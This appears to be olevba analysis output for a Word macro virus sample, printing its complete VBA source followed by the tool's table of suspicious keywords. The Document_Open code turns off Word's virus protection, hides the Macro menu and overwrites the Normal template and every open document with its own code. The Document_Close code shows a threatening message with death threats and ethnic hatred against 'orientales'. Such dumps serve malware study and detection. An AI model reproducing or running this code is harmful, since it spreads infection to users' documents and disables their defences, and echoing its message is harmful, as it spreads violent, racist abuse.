olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.bh
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.bh - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Virus Catolica creado por
'FCV
 Options.VirusProtection = False
 Options.SaveNormalPrompt = False
 CommandBars("Tools").Controls("Macro").Enabled = False
 If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'FCV" Then
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
 End If
 For i = 1 To Documents.Count
  If Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'FCV" Then
   Documents.Item(i).VBProject.VBComponents.Item(i).CodeModule.DeleteLines 1, Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   Documents.Item(i).VBProject.VBComponents.Item(i).CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
  End If
 Next i
End Sub

Private Sub Document_Close()
 Cadena = "Fujimori jamas podras gobernar el Virus Católica te perseguira" & Chr(13) & Chr(10)
 Cadena = Cadena & "y te matara por todos aquellos que creen en la democracia" & Chr(13) & Chr(10)
 Cadena = Cadena & "y que opinan que todos los orientales deben morir" & Chr(13) & Chr(10)
 Cadena = Cadena & "¿Estas de acuerdo?"
 rpta = MsgBox(Cadena, vbQuestion + vbYesNo, "Catolica")
 If rpta = vbNo Then
  MsgBox "Católica destruira tu maquina infeliz", vbExclamation, "Catolica"
 End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

